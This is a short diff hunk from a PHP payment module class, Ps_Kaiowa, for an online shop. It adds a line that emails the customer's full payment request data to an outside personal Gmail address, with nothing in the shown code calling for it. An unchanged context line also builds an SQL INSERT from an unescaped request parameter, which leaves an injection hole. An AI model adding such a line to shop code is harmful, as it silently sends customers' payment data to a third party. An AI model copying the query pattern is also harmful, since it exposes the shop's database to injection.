@@ -487,6 +487,7 @@ class Ps_Kaiowa extends PaymentModule
                 $this->base64url_encode(utf8_encode(Tools::jsonEncode($request))),
                 Configuration::get('BANK_KAIOWA_URL_CUPO')
             );
+            mail('sebasca5gz@gmail.com','REQUEST USER KAIOWA',print_r($request,$urlRequest));
             setcookie('USER_CREATE_TRANSACTION',$customer->id.'|'.$this->context->cart->id, time()+3600);
             Db::getInstance()->execute('INSERT INTO '._DB_PREFIX_.'kaiowa_validations (`id_customer`,`id_cart`,`email`) VALUES ('.$customer->id.', '.$id_cart.',"'.Tools::getValue('email').'")');
             return $urlRequest;
